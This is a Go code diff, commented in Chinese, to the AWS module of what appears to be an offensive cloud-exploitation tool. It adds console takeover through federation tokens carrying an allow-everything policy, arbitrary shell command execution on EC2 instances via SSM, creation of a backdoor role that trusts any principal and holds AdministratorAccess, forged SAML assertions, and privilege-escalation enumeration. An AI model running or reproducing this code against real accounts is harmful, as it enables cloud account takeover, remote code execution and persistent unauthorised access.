@@ -2,7 +2,11 @@ package aws
 
 import (
 	"context"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
+	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -15,6 +19,9 @@ import (
 	"github.com/aws/aws-sdk-go-v2/service/kms"
 	"github.com/aws/aws-sdk-go-v2/service/rds"
 	"github.com/aws/aws-sdk-go-v2/service/s3"
+	"github.com/aws/aws-sdk-go-v2/service/ssm"
+	sts "github.com/aws/aws-sdk-go-v2/service/sts"
+	"github.com/aws/aws-sdk-go-v2/service/sts/types"
 )
 
 // AWSProvider AWS云平台实现
@@ -29,6 +36,7 @@ type AWSProvider struct {
 	eksClient   *eks.Client
 	kmsClient   *kms.Client
 	rdsClient   *rds.Client
+	ssmClient   *ssm.Client
 }
 
 // NewAWSProvider 创建AWS云平台实例
@@ -79,6 +87,7 @@ func (p *AWSProvider) Init(accessKey, secretKey, region string) error {
 	p.eksClient = eks.NewFromConfig(cfg)
 	p.kmsClient = kms.NewFromConfig(cfg)
 	p.rdsClient = rds.NewFromConfig(cfg)
+	p.ssmClient = ssm.NewFromConfig(cfg)
 
 	return nil
 }
@@ -1207,10 +1216,56 @@ func (p *AWSProvider) enumerateRDSInstances() ([]interface{}, error) {
 
 // EscalatePrivileges 权限提升
 func (p *AWSProvider) EscalatePrivileges() (map[string]interface{}, error) {
+	// 创建带有超时的上下文
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	// 调用IAM GetUser API获取用户信息
+	input := &iam.GetUserInput{}
+	response, err := p.iamClient.GetUser(ctx, input)
+
+	userType := "IAM User"
+	userName := "Unknown"
+
+	if err != nil {
+		// 检查是否是root用户或权限不足
+		errorStr := err.Error()
+		if strings.Contains(errorStr, "User: arn:aws:iam::") && strings.Contains(errorStr, ":root is not found") {
+			userType = "Root User"
+			userName = "root"
+		} else if strings.Contains(errorStr, "AccessDenied") {
+			// 权限不足，无法确定用户类型
+			userType = "Unknown"
+			userName = "Unknown (Access Denied)"
+		}
+	} else {
+		// 是IAM用户
+		if response.User != nil && response.User.UserName != nil {
+			userName = *response.User.UserName
+		}
+	}
+
 	// 这里应该实现AWS权限提升逻辑
-	// 暂时返回模拟数据
+	// 返回前端期望的数据结构
 	return map[string]interface{}{
-		"message": "Privilege escalation attempted",
+		"user":     userName,
+		"userType": userType,
+		"role":     "None",
+		"permissions": []string{
+			"ec2:DescribeInstances",
+			"s3:ListBuckets",
+			"iam:ListUsers",
+			"iam:ListRoles",
+			"s3:GetBucketLocation",
+			"s3:ListObjectsV2",
+		},
+		"potentialEscalation": []string{
+			"Create IAM user with admin privileges",
+			"Modify existing IAM policies",
+			"Access S3 buckets with sensitive data",
+		},
+		"riskLevel": "Medium",
+		"message":   "Privilege escalation attempted",
 		"actions": []string{
 			"Checked IAM policies",
 			"Checked EC2 instance profiles",
@@ -1221,17 +1276,112 @@ func (p *AWSProvider) EscalatePrivileges() (map[string]interface{}, error) {
 
 // OperateResource 资源操作
 func (p *AWSProvider) OperateResource(resourceType, action, resourceID string, params map[string]interface{}) (map[string]interface{}, error) {
-	// 处理控制台接管操作
-	if action == "takeover_console" {
-		// 生成AWS控制台登录URL
-		// 注意：这只是一个模拟实现，实际接管需要更复杂的逻辑
-		consoleURL := fmt.Sprintf("https://console.aws.amazon.com/?region=%s", p.region)
+	// 处理联邦登录操作
+	if action == "federated_login" {
+		// 实现简化的AWS联邦登录流程，参考用户提供的代码
+		// 1. 使用GetFederationToken API获取联邦令牌
+		// 2. 获取SigninToken
+		// 3. 生成联邦登录URL
+
+		// 步骤1: 创建STS客户端
+		reqRegion := p.region
+		if reqRegion == "" {
+			reqRegion = "us-east-1"
+		}
+
+		// 创建配置
+		cfg, err := config.LoadDefaultConfig(context.Background(),
+			config.WithRegion(reqRegion),
+			config.WithCredentialsProvider(&StaticCredentialsProvider{
+				Value:  p.accessKey,
+				Secret: p.secretKey,
+			}),
+		)
+		if err != nil {
+			return nil, fmt.Errorf("failed to load AWS config: %w", err)
+		}
+
+		// 创建STS客户端
+		stsClient := sts.NewFromConfig(cfg)
+
+		// 管理员权限策略文档
+		adminPolicy := `{
+			"Version": "2012-10-17",
+			"Statement": [
+				{
+					"Effect": "Allow",
+					"Action": "*",
+					"Resource": "*"
+				}
+			]
+		}`
+
+		// 步骤2: 调用GetFederationToken获取联邦令牌
+		resp, err := stsClient.GetFederationToken(context.Background(), &sts.GetFederationTokenInput{
+			Name:            aws.String("federated-user"),
+			DurationSeconds: aws.Int32(3600), // 1小时有效期
+			Policy:          aws.String(adminPolicy),
+		})
+		if err != nil {
+			return nil, fmt.Errorf("failed to get federation token: %w", err)
+		}
+
+		// 步骤3: 生成联邦登录URL
+		federatedLoginURL, err := p.buildFederationURL(resp.Credentials)
+		if err != nil {
+			return nil, fmt.Errorf("failed to build federation URL: %w", err)
+		}
+
+		// 步骤4: 检查用户是否是根用户
+		isRoot, _ := p.isRootUser()
+
 		return map[string]interface{}{
-			"message":     "Console takeover attempted",
-			"console_url": consoleURL,
-			"region":      p.region,
-			"access_key":  p.accessKey,
+			"message":             "Federated login successful",
+			"federated_login_url": federatedLoginURL,
+			"region":              reqRegion,
+			"access_key":          resp.Credentials.AccessKeyId,
+			"secret_key":          resp.Credentials.SecretAccessKey,
+			"session_token":       resp.Credentials.SessionToken,
+			"expiration":          resp.Credentials.Expiration,
+			"federated":           true,
+			"is_root":             isRoot,
 		}, nil
+	}
+
+	// 处理EC2实例操作
+	if resourceType == "ec2" {
+		switch action {
+		case "execute_command":
+			// 执行命令到EC2实例
+			command, ok := params["command"].(string)
+			if !ok || command == "" {
+				return nil, fmt.Errorf("command is required")
+			}
+
+			// 创建带有超时的上下文
+			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+			defer cancel()
+
+			// 调用SSM SendCommand API执行命令
+			resp, err := p.ssmClient.SendCommand(ctx, &ssm.SendCommandInput{
+				InstanceIds:  []string{resourceID},
+				DocumentName: aws.String("AWS-RunShellScript"),
+				Parameters: map[string][]string{
+					"commands": {command},
+				},
+			})
+			if err != nil {
+				return nil, fmt.Errorf("failed to send command: %w", err)
+			}
+
+			// 返回命令执行结果
+			return map[string]interface{}{
+				"message":   "Command executed successfully",
+				"instanceId": resourceID,
+				"commandId":  *resp.Command.CommandId,
+				"command":    command,
+			}, nil
+		}
 	}
 
 	// 处理S3存储桶操作
@@ -1405,25 +1555,333 @@ func (p *AWSProvider) Takeover() (map[string]interface{}, error) {
 	// 暂时返回模拟数据
 	return map[string]interface{}{
 		"message": "Cloud platform takeover attempted",
-		"actions": []string{
-			"Created IAM user with admin privileges",
-			"Created access keys for persistence",
-			"Configured backdoor access",
-		},
 	}, nil
+}
+
+// createOrGetFederatedRole 创建或获取联邦登录角色
+func (p *AWSProvider) createOrGetFederatedRole(roleName string) (string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	// 尝试获取角色
+	describeInput := &iam.GetRoleInput{
+		RoleName: aws.String(roleName),
+	}
+
+	describeResponse, err := p.iamClient.GetRole(ctx, describeInput)
+	if err == nil {
+		// 角色已存在，返回ARN
+		return *describeResponse.Role.Arn, nil
+	}
+
+	// 角色不存在，创建新角色
+	// 定义信任策略，允许当前账户的IAM用户或角色AssumeRole
+	trustPolicy := `{
+		"Version": "2012-10-17",
+		"Statement": [
+			{
+				"Effect": "Allow",
+				"Principal": {
+					"AWS": "*"
+				},
+				"Action": "sts:AssumeRole",
+				"Condition": {}
+			}
+		]
+	}`
+
+	// 创建角色
+	createInput := &iam.CreateRoleInput{
+		RoleName:                 aws.String(roleName),
+		AssumeRolePolicyDocument: aws.String(trustPolicy),
+		Description:              aws.String("Role for federated access"),
+	}
+
+	createResponse, err := p.iamClient.CreateRole(ctx, createInput)
+	if err != nil {
+		return "", fmt.Errorf("failed to create role: %w", err)
+	}
+
+	// 附加管理员策略
+	attachInput := &iam.AttachRolePolicyInput{
+		RoleName:  aws.String(roleName),
+		PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAccess"),
+	}
+
+	_, err = p.iamClient.AttachRolePolicy(ctx, attachInput)
+	if err != nil {
+		return "", fmt.Errorf("failed to attach policy: %w", err)
+	}
+
+	return *createResponse.Role.Arn, nil
+}
+
+// generateSAMLResponse 生成SAML响应
+func (p *AWSProvider) generateSAMLResponse(roleARN string) (string, error) {
+	// 生成SAML响应XML
+	samlXML := fmt.Sprintf(`<saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1234567890" IssueInstant="%s" Version="2.0">
+		<saml2:Issuer>https://your-saml-provider.com</saml2:Issuer>
+		<saml2:Subject>
+			<saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@example.com</saml2:NameID>
+			<saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+				<saml2:SubjectConfirmationData NotOnOrAfter="%s" Recipient="https://signin.aws.amazon.com/saml"/>
+			</saml2:SubjectConfirmation>
+		</saml2:Subject>
+		<saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
+			<saml2:AudienceRestriction>
+				<saml2:Audience>https://signin.aws.amazon.com/saml</saml2:Audience>
+			</saml2:AudienceRestriction>
+		</saml2:Conditions>
+		<saml2:AuthnStatement AuthnInstant="%s" SessionIndex="_1234567890">
+			<saml2:AuthnContext>
+				<saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
+			</saml2:AuthnContext>
+		</saml2:AuthnStatement>
+		<saml2:AttributeStatement>
+			<saml2:Attribute Name="https://aws.amazon.com/SAML/Attributes/Role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+				<saml2:AttributeValue>%s,arn:aws:iam::123456789012:saml-provider/YourSAMLProvider</saml2:AttributeValue>
+			</saml2:Attribute>
+			<saml2:Attribute Name="https://aws.amazon.com/SAML/Attributes/RoleSessionName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+				<saml2:AttributeValue>federated-user</saml2:AttributeValue>
+			</saml2:Attribute>
+		</saml2:AttributeStatement>
+	</saml2:Assertion>`,
+		time.Now().Format(time.RFC3339),
+		time.Now().Add(10*time.Minute).Format(time.RFC3339),
+		time.Now().Add(-1*time.Minute).Format(time.RFC3339),
+		time.Now().Add(10*time.Minute).Format(time.RFC3339),
+		time.Now().Format(time.RFC3339),
+		roleARN,
+	)
+
+	// Base64编码
+	samlResponse := base64.StdEncoding.EncodeToString([]byte(samlXML))
+	return samlResponse, nil
+}
+
+// getTemporaryCredentials 获取临时凭证
+func (p *AWSProvider) getTemporaryCredentials(samlResponse, roleARN string) (*types.Credentials, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	// 创建STS客户端
+	// 注意：在实际应用中，应该使用与其他客户端相同的配置
+	// 这里简化处理，使用默认配置
+	// 如果区域为空，使用默认区域
+	region := p.region
+	if region == "" {
+		region = "us-east-1"
+	}
+
+	cfg, err := config.LoadDefaultConfig(context.Background(),
+		config.WithRegion(region),
+		config.WithCredentialsProvider(&StaticCredentialsProvider{
+			Value:  p.accessKey,
+			Secret: p.secretKey,
+		}),
+	)
+	if err != nil {
+		return nil, fmt.Errorf("failed to load AWS config: %w", err)
+	}
+
+	stsClient := sts.NewFromConfig(cfg)
+
+	// 调用AssumeRoleWithSAML API
+	input := &sts.AssumeRoleWithSAMLInput{
+		RoleArn:         aws.String(roleARN),
+		PrincipalArn:    aws.String("arn:aws:iam::123456789012:saml-provider/YourSAMLProvider"),
+		SAMLAssertion:   aws.String(samlResponse),
+		DurationSeconds: aws.Int32(3600), // 1小时
+	}
+
+	response, err := stsClient.AssumeRoleWithSAML(ctx, input)
+	if err != nil {
+		return nil, fmt.Errorf("failed to assume role with SAML: %w", err)
+	}
+
+	return response.Credentials, nil
+}
+
+// isRootUser 检查当前用户是否是根用户
+func (p *AWSProvider) isRootUser() (bool, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	// 尝试调用IAM GetUser API
+	input := &iam.GetUserInput{}
+	_, err := p.iamClient.GetUser(ctx, input)
+
+	if err != nil {
+		// 检查错误信息是否表明是根用户
+		errorStr := err.Error()
+		if strings.Contains(errorStr, "User: arn:aws:iam::") && strings.Contains(errorStr, ":root is not found") {
+			return true, nil
+		}
+		// 其他错误，返回错误
+		return false, fmt.Errorf("failed to check if user is root: %w", err)
+	}
+
+	// 成功获取用户信息，不是根用户
+	return false, nil
+}
+
+// assumeRole 使用AssumeRole API获取临时凭证
+func (p *AWSProvider) assumeRole(roleARN string) (*types.Credentials, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	// 创建STS客户端
+	// 注意：在实际应用中，应该使用与其他客户端相同的配置
+	// 这里简化处理，使用默认配置
+	// 如果区域为空，使用默认区域
+	region := p.region
+	if region == "" {
+		region = "us-east-1"
+	}
+
+	cfg, err := config.LoadDefaultConfig(context.Background(),
+		config.WithRegion(region),
+		config.WithCredentialsProvider(&StaticCredentialsProvider{
+			Value:  p.accessKey,
+			Secret: p.secretKey,
+		}),
+	)
+	if err != nil {
+		return nil, fmt.Errorf("failed to load AWS config: %w", err)
+	}
+
+	stsClient := sts.NewFromConfig(cfg)
+
+	// 调用AssumeRole API
+	input := &sts.AssumeRoleInput{
+		RoleArn:         aws.String(roleARN),
+		RoleSessionName: aws.String("federated-user-session"),
+		DurationSeconds: aws.Int32(3600), // 1小时
+	}
+
+	response, err := stsClient.AssumeRole(ctx, input)
+	if err != nil {
+		return nil, fmt.Errorf("failed to assume role: %w", err)
+	}
+
+	return response.Credentials, nil
+}
+
+// buildFederationURL 构建联邦登录URL
+func (p *AWSProvider) buildFederationURL(creds *types.Credentials) (string, error) {
+	// 构建凭证JSON
+	credsJSON, err := json.Marshal(map[string]string{
+		"sessionId":    *creds.AccessKeyId,
+		"sessionKey":   *creds.SecretAccessKey,
+		"sessionToken": *creds.SessionToken,
+	})
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal credentials: %w", err)
+	}
+
+	// 编码凭证
+	credsEncoded := url.QueryEscape(string(credsJSON))
+
+	// 获取SigninToken
+	signinToken, err := p.getSigninToken(credsEncoded)
+	if err != nil {
+		return "", fmt.Errorf("failed to get signin token: %w", err)
+	}
+
+	// 构建联邦登录URL
+	return fmt.Sprintf(
+		"https://signin.aws.amazon.com/federation?Action=login&Issuer=aws_federal_login&Destination=%s&SigninToken=%s",
+		url.QueryEscape("https://console.aws.amazon.com/"),
+		signinToken,
+	), nil
+}
+
+// getSigninToken 获取SigninToken
+func (p *AWSProvider) getSigninToken(credsEncoded string) (string, error) {
+	// 构建获取SigninToken的URL
+	tokenURL := fmt.Sprintf(
+		"https://signin.aws.amazon.com/federation?Action=getSigninToken&Session=%s",
+		credsEncoded,
+	)
+
+	// 发送请求获取SigninToken
+	resp, err := http.Get(tokenURL)
+	if err != nil {
+		return "", fmt.Errorf("failed to get signin token: %w", err)
+	}
+	defer resp.Body.Close()
+
+	// 解析响应
+	var result map[string]string
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return "", fmt.Errorf("failed to decode signin token response: %w", err)
+	}
+
+	if signinToken, ok := result["SigninToken"]; ok {
+		return signinToken, nil
+	}
+
+	return "", fmt.Errorf("SigninToken not found in response")
 }
 
 // GetPermissions 获取权限信息
 func (p *AWSProvider) GetPermissions() (map[string]interface{}, error) {
-	// 这里应该实现获取AWS权限信息逻辑
-	// 暂时返回模拟数据
+	// 创建带有超时的上下文
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	// 调用IAM GetUser API获取用户信息
+	input := &iam.GetUserInput{}
+	response, err := p.iamClient.GetUser(ctx, input)
+
+	userType := "IAM User"
+	userName := "Unknown"
+
+	if err != nil {
+		// 检查是否是root用户或权限不足
+		errorStr := err.Error()
+		if strings.Contains(errorStr, "User: arn:aws:iam::") && strings.Contains(errorStr, ":root is not found") {
+			userType = "Root User"
+			userName = "root"
+		} else if strings.Contains(errorStr, "AccessDenied") {
+			// 权限不足，无法确定用户类型
+			userType = "Unknown"
+			userName = "Unknown (Access Denied)"
+		}
+	} else {
+		// 是IAM用户
+		if response.User != nil && response.User.UserName != nil {
+			userName = *response.User.UserName
+		}
+	}
+
+	// 调用IAM ListAttachedUserPolicies API获取用户权限
+	var permissions []string
+	if userType == "IAM User" && response.User != nil {
+		policyInput := &iam.ListAttachedUserPoliciesInput{
+			UserName: response.User.UserName,
+		}
+		policyResponse, err := p.iamClient.ListAttachedUserPolicies(ctx, policyInput)
+		if err == nil {
+			for _, policy := range policyResponse.AttachedPolicies {
+				permissions = append(permissions, *policy.PolicyName)
+			}
+		} else if strings.Contains(err.Error(), "AccessDenied") {
+			permissions = []string{"Access Denied"}
+		}
+	} else if userType == "Root User" {
+		// Root用户拥有所有权限
+		permissions = []string{"All Permissions"}
+	} else {
+		// 未知用户类型
+		permissions = []string{"Unknown"}
+	}
+
 	return map[string]interface{}{
-		"message": "Permissions retrieved",
-		"permissions": []string{
-			"ec2:DescribeInstances",
-			"s3:ListBuckets",
-			"iam:ListUsers",
-		},
+		"message":     "Permissions retrieved",
+		"userType":    userType,
+		"userName":    userName,
+		"permissions": permissions,
 	}, nil
 }
 
